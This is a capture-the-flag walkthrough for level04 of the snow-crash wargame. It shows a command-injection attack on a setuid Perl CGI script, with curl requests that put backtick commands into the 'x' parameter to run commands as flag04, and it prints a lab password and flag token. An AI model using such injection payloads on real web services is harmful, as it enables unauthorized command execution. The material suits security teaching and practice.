# Level04

Login as `level04`

```bash
┌──$ [~/42/2021/snow-crash]
└─>  ssh 192.168.1.64 -p 4242 -l level03
level04@192.168.1.64's password: qi0maab88jeaj46qoumi7maus
```

We have a Perl script in the home directory.

```bash
level04@SnowCrash:~$ ls -l
total 4
-rwsr-sr-x 1 flag04 level04 152 Mar  5  2016 level04.pl
```

After `cat level04.pl` we notice that a web page running on port **4747**

We use `nc -vz localhost 4747` to check the connection without sending any data and in verbose mode.

The script expects a value **x** passed as a parameter which is passed to `x()` function. Then after evaluate the argument with backtick it prints out x with echo.

So we pass `whoami` command and notice that it's evaluated and executed as `flag04`

```bash
level04@SnowCrash:~$ curl localhost:4747/?x="\`/usr/bin/whoami\`"
flag04
```

So we can use `getflag` as parameter to use it as flag04 owner and  get the flag.

```bash
level04@SnowCrash:~$ curl localhost:4747/?x="\`/bin/getflag\`"
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```
